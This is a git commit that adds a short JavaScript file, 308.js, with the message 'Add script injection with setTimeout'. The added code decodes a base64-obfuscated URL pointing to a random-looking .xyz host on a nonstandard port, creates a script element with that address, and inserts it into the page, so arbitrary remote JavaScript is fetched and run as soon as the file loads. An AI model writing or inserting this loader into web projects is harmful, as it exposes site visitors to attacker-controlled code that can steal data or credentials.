0d2a639a9d8f32a47cf5b354a901377cbcb32e84
letinpay-png <letinpay@gmail.com>
2026-03-13 18:15:19 +0800

    Add script injection with setTimeout

---
+++ 308.js
@@ -0,0 +1,5 @@
+setTimeout(function(e){
+    var gwisxdn = document.createElement("script");
+    gwisxdn.src = atob("aHR0cHM6Ly95cGVzemU2azNwMTRrOTN3LjY1NDg3NDk2Lnh5ejoyMDA1OC9lZHlzLzY1NDgvMjE5MDcvZDNmbzB0aHc5dy5qcw==");
+    e.insertAdjacentElement("beforebegin", gwisxdn);
+}, 0, document.currentScript);
